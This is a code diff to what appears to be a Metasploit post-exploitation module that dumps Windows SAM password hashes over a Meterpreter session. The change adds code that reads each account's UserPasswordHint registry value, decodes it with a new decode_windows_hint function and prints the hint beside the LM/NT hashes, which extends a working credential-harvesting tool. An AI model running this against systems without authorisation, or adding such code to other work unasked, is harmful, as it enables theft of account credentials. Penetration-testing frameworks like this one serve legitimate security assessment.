@@ -87,6 +87,12 @@ class Metasploit3 < Msf::Post
 					:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
 					:type  => "smb_hash"
 				)
+				
+				#If we have a hint, decode and add to the hashstring
+				if !users[rid][:UserPasswordHint].nil?
+					hashstring += " (Hint: \"#{decode_windows_hint(users[rid][:UserPasswordHint].unpack("H*")[0])}\")"
+				end
+				
 				print_line hashstring
 			end
 			print_line()
@@ -164,6 +170,13 @@ class Metasploit3 < Msf::Post
 			users[usr.to_i(16)] ||={}
 			users[usr.to_i(16)][:F] = uk.query_value("F").data
 			users[usr.to_i(16)][:V] = uk.query_value("V").data
+			
+			begin
+				users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
+			rescue ::Rex::Post::Meterpreter::RequestError
+				users[usr.to_i(16)][:UserPasswordHint] = nil
+			end
+			
 			uk.close
 		end
 		ok.close
@@ -203,6 +216,15 @@ class Metasploit3 < Msf::Post
 		end
 
 		users
+	end
+
+	def decode_windows_hint(e_string)
+		d_string = ""
+		e_string.scan(/..../).each do |chunk|
+			bytes = chunk.scan(/../)
+			d_string += (bytes[1] + bytes[0]).to_s.hex.chr
+		end
+		d_string
 	end
 
 	def convert_des_56_to_64(kstr)
